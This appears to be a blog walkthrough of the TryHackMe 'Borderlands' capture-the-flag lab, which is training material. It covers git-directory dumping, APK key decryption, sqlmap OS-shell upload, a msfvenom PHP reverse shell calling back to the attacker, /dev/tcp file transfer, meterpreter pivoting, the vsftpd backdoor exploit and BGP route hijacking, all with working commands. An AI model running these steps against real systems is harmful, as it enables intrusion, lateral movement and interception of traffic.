
Borderlands
=========================

![titlecard](/assets/images/THM/2020-08-13-borderlands/1.png)

[Link:
https://tryhackme.com/room/borderlands](https://tryhackme.com/room/borderlands)



### Task 1-2: Web flag

The web app is located in Port 80.

![web](/assets/images/THM/2020-08-13-borderlands/2.png)

This is the main page of the web app. From the Nmap scan
before, you will notice the following thing.

![the git](/assets/images/THM/2020-08-13-borderlands/3.png)

The web app contains a git directory. Accessing the directory gives the
following status.

![403](/assets/images/THM/2020-08-13-borderlands/4.png)

A 403 status. This reminds me of the git exploit, you can read the proof
of concept right inside [this
article](https://github.com/bl4de/research/tree/master/hidden_directories_leaks#hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application).
To make things simple, I’m going to pull all the files from the git
using [gitHack](https://github.com/lijiejie/GitHack). Clone the git and
punch in the following command.

``` {.highlight}
python GitHack.py http://<Target IP>/.git/
```

![git files](/assets/images/THM/2020-08-13-borderlands/5.png)

We just pulled the entire server file using GitHack. Please be noted
that the concept of Githack is similar to the git exploit and I just
make things simple here. In short, I’m a script kiddie now. That is a
sin XD.

By reading the file, I’m stumbled across the web app flag. It is located
at home.php.

One flag down!

### Task 1-3: Git flag

First off, download the git log from the site. The URL is

``` {.highlight}
http://<machine IP>/.git/logs/HEAD
```

![log](/assets/images/THM/2020-08-13-borderlands/6.png)

Noticed that the author remove the sensitive data on the **object
b2f776a52fe81a731c6c0fa896e7f9548aafceab**. The best bet is we can find
the sensitive data in the **object
79c9539b6566b06d6dec2755fdf58f5f9ec8822f**. Use the following URL to
extract the object from the site (The first two letter named as a
directory)

``` {.highlight}
http://<Machine IP>/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

Before we look into the object, we have to create a dummy git folder.

``` {.highlight}
git init
```

![all the files](/assets/images/THM/2020-08-13-borderlands/7.png)

I created my own dummy inside the folder in which all the server files
have been pulled. Locate inside the dummy git and then object, create a
folder named ‘79’. Copy the freshly downloaded object file into folder
79.

![download](/assets/images/THM/2020-08-13-borderlands/8.png)

Locate into the .git folder and read the content of the object with the
following command.

``` {.highlight}
git cat-file -p 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

![gitcat](/assets/images/THM/2020-08-13-borderlands/9.png)

We got a tree **object 51d63292792fb7f97728cd3dcaac3ef364f374ba**.
Similar to previous step, download the object file with the following
URL.

``` {.highlight}
http://<Machine IP>/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba
```

Create a **51** folder inside the object file and copy the downloaded
object inside the folder. After that, read the tree object.

![tree object](/assets/images/THM/2020-08-13-borderlands/10.png)

The sensitive data is stored inside api.php or object
**2229eb414d7945688b90d7cd0a786fd888bcc6a4**. Repeat the same stuff
again and read the object.

You get your git flag.

### Task 1-1: APK flag

Time to make a visit on the android apps. For your information, you can
actually finish the task with apktool only. In order to make things
simple to understand, I used [jadx](https://github.com/skylot/jadx) and
apktool. Your task is to find and decrypt the API key which is a flag.

![apikey](/assets/images/THM/2020-08-13-borderlands/11.png)

From the jadx decompiler, the encrypted key variable is called
**‘encrypted\_api\_key’**. After that, reverse engineer the apk using
apktool. Then, make a search for the variable name.

``` {.highlight}
apktool d mobile-app-prototype.apk
grep -rn 'encrypted_api_key'
```

![encrypt](/assets/images/THM/2020-08-13-borderlands/12.png)

If you refer to the api.php before, you can find the first 20 letters of
the android API key. That is why I put tasks 1-1 after task 1-2.

![firstwords](/assets/images/THM/2020-08-13-borderlands/13.png)

Make a comparison between the two strings.

``` {.highlight}
CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo (Encrypted)
ANDVOWLDLAS5Q8OQZ2tu           (Plaintext)
```

You will notice the numbering is in the same position. So, this is
either a vigenere cipher or a Ceaser cipher. Testing with Cease cipher
does not yield any luck on it. If you refer back to the jadx, you will
see the decrypt function require a key. I’m 100% sure the cipher is a
vigenere. To obtain the key, simply do a reverse key search based on the
vigenere table.

![vigenere table](/assets/images/THM/2020-08-13-borderlands/14.png)

The left letter bar represents plaintext, the upper letter bar
represents key (either one, the table is symmetrical) and the inner
table is ciphertext. Let’s take the second letter and compare it.

``` {.highlight}
B (Encrypt)
N (Plaintext)
O (Key)
```

![vigenre poc](/assets/images/THM/2020-08-13-borderlands/15.png)

If you keep repeating the process, you will eventually find the key. The
key is CONTEXT. Use the online tool and capture the last API key.

### Task 1-4: SQL injection

Refer to the home.php, the site actually vulnerable to SQL injection.
The injectable URL is

``` {.highlight}
http://<Machine IP>/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
```

By following up on [this
tutorial](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/),
we are able to create a reverse shell for the machine. If you are lazy
to open up the Burp suite, copy the following response as save it as
**r.txt**

``` {.highlight}
GET /api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD HTTP/1.1
Host: <Machine IP>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=uafomq8a14mf4lkb7pktbrgt69
Connection: close
Upgrade-Insecure-Requests: 1
```

Make sure you change the host IP address before saving it. After that,
launch the sqlmap with the following command.

``` {.highlight}
sqlmap -r r.txt --dbs --batch
```

![sqlmap](/assets/images/THM/2020-08-13-borderlands/16.png)

If you are able to get a list of SQL tables, you are good to go. Or
else, check the r.txt file for any misconfiguration. As for the next
step, we are going to create a SQL upload page.

``` {.highlight}
sqlmap -r r.txt -D myfirstwebsite --os-shell
```

![sqlmap more](/assets/images/THM/2020-08-13-borderlands/17.png)

Select PHP (option 4), ‘no’ option and then brute-force (option 4).

![sqlmap more and
more](/assets/images/THM/2020-08-13-borderlands/18.png)

Enter /var/www/html as custom directory.

![sqlmap final](/assets/images/THM/2020-08-13-borderlands/19.png)

Copy the sqlmap file uploader URL and visit the site.

![uploader](/assets/images/THM/2020-08-13-borderlands/20.png)

We are going to generate a reverse shell using msfvenom.

``` {.highlight}
msfvenom -p php/meterpreter/reverse_tcp lhost=<tunnel IP> lport=4445 -f raw
```

![msfvenom](/assets/images/THM/2020-08-13-borderlands/21.png)

Copy the text (pink highlighted) and save it as shell.php. After that,
upload the shell.php using the sqlmap uploader.

![upload it](/assets/images/THM/2020-08-13-borderlands/22.png)

Open up msfconsole and punch the following setting.

``` {.highlight}
msf> use multi/handler
msf exploit(handler) > set lport 4445
msf exploit(handler) > set lhost tun0
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > exploit
```

Visit the following URL to trigger the reverse shell

``` {.highlight}
http://<Machine IP>/shell.php
```

### Task 1-5: Pivot the machine

There is numerous way to complete this task. User tsuki recommends using
Nmap static binary to do the recon and transfer the file using ncat and
bash shell. (I haven’t test it)

``` {.highlight}
ncat -lvnp 80 < nmap
cat > /tmp/nmap < /dev/tcp/<tunnel IP>/80
```

My approach is a bit dumb but it just works. Basically I compressed the
file and split into 512 Kb size and then upload through the sqlmap
uploader. This is because of the limitation of upload file size by Nginx
server.

``` {.highlight}
split -b 512K nmap.tar.xz
```

After that, we are going to join the split packet in the victim machine.

``` {.highlight}
cat xa* > namp.tar.xz
tar -xvf nmap.tar.xz
```

Before we do a scan, we have to know the private IP address range.

![address range](/assets/images/THM/2020-08-13-borderlands/23.png)

The most suitable candidate is 172.x.x.x. Why? Private IP started with
10.x.x.x used by THM and 192.168.x.x is usually for home router. Context
is a big company, 172.x.x.x might be our only way in. If we
brute-forcing our way in, there will be more than 1 million
possibilities. The most commonly used subnet is 172.16.0.0/16. Just do a
fast scan with the following command.

``` {.highlight}
./nmap -sn -T5 --min-parallelism 100  172.16.0.0/16
```

![nmap](/assets/images/THM/2020-08-13-borderlands/24.png)

Look like we have something on the 172.16.1.0/24 subnet. We are going to
do a deeper scan of it.

![nmap deeper](/assets/images/THM/2020-08-13-borderlands/25.png)

The victim IP we are in is 172.16.1.10. Note that, 172.16.1.128 is up
with both FTP and BGP server on. Since the victim machine we are
currently in is very limited in resource, we have to forward the port 21
to the localhost using meterpreter from the reverse shell. (simply exit
the shell)

``` {.highlight}
meterpreter> portfwd add -l 21 -p 21 -r 172.16.1.128
```

After that, examine the banner lead us to
[vulnerability](https://www.exploit-db.com/exploits/17491).

![vuln](/assets/images/THM/2020-08-13-borderlands/26.png)

If you read [this
article](https://sweshsec.wordpress.com/2015/07/31/vsftpd-vulnerability-exploitation-with-manual-approach/)
which is manual vsftpd exploitation, we need to port forward port 6200
as well. However, the exploit won’t work if you port forward port 21 and
6200 together.

#### Step 1: Port forward port 21

We have done it previously.

#### Step 2: Open Metasploit and exploit the port

Use the following command to exploit the port.

``` {.highlight}
msf5> use exploit/unix/ftp/vsftpd_234_backdoor
msf5> set RHOSTS 127.0.0.1
msf5> exploit
```

You will get a no session after that.

![exploit ftp](/assets/images/THM/2020-08-13-borderlands/27.png)

#### Step 3: Port forward port 6200

Simply input the following command to port forward port 6200.

``` {.highlight}
meterpreter> portfwd add -l 6200 -p 6200 -r 172.16.1.128
```

#### Step 4: Re-exploitation

Re-exploit the port again and you will get a root shell from
172.16.1.128.

![root](/assets/images/THM/2020-08-13-borderlands/28.png)

Now, capture the flag

### Task 1-5 and 1-6: UDP and TCP flag

I would like to credit this task to Tsuki who give me so many hints on
solving this task. This task is almost similar to the [HTB
carrier](https://0xrick.github.io/hack-the-box/carrier/) where you need
to play around with the BGP configure file.

First off, we are going to launch the BGP config shell with the
following command.

``` {.highlight}
vtysh
```

![config file](/assets/images/THM/2020-08-13-borderlands/29.png)

Our main objective is to hijack the sever with flag and re-route the
flag packet to us. [This article provides a simplified
explanation](https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/)
of BGP hijacking. Next, enter the BGP configuration mode with the
following command.

``` {.highlight}
router1.ctx.ctf# config terminal
```

We need to add a route to make sure the flag server route the packet to
us.

``` {.highlight}
router1.ctx.ctf(config)# router bgp 60001
router1.ctx.ctf(config)# network 172.16.2.0/25
router1.ctx.ctf(config)# network 172.16.3.0/25
router1.ctx.ctf(config)# end
router1.ctx.ctf# clear ip bgp *
```

Do a short check on the route.

![full config](/assets/images/THM/2020-08-13-borderlands/30.png)

It looks like all the traffics routes to us. If you finished with the
configuration, read the incoming packet with TCP dump.

``` {.highlight}
tcpdump -i eth0 -A
```

The flag will be redirected.
